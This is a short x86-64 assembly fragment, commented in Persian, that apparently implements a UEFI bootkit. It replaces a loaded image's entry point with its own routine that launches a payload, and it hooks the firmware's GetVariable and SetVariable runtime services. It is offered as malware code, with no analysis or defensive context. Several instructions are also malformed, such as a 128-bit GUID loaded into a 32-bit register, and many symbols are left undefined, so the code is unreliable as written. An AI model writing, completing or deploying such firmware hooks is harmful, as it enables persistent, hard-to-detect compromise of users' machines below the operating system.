; تزریق به EFI Boot Manager
section .text

efi_injection:
    ; یافتن جدول EFI System Table
    mov eax, [EFI_SYSTEM_TABLE_ADDR]
    test eax, eax
    jz .exit

    ; یافتن پروتکل Loaded Image
    mov rcx, eax
    mov edx, EFI_LOADED_IMAGE_PROTOCOL_GUID
    mov r8, loaded_image_proto
    call [rcx + EFI_SYSTEM_TABLE_BOOTSERVICES]
    test rax, rax
    jnz .exit

    ; جایگزینی Entry Point
    mov rcx, [loaded_image_proto]
    mov rax, [rcx + EFI_LOADED_IMAGE_ENTRY_POINT]
    mov [original_entry_point], rax
    mov [rcx + EFI_LOADED_IMAGE_ENTRY_POINT], our_entry_point

    ; تزریق به خدمات رانتایم
    call hook_runtime_services
.exit:
    ret

our_entry_point:
    ; بازگردانی نقطه ورود اصلی
    push rdi
    mov rdi, [original_entry_point]
    call rdi
    pop rdi

    ; فعال‌سازی پیلود
    call activate_payload
    ret

hook_runtime_services:
    ; جایگزینی خدمات حیاتی
    mov rcx, [EFI_SYSTEM_TABLE_RUNTIMESERVICES]
    mov rax, [rcx + EFI_GET_VARIABLE]
    mov [original_get_variable], rax
    mov [rcx + EFI_GET_VARIABLE], our_get_variable

    mov rax, [rcx + EFI_SET_VARIABLE]
    mov [original_set_variable], rax
    mov [rcx + EFI_SET_VARIABLE], our_set_variable
    ret
    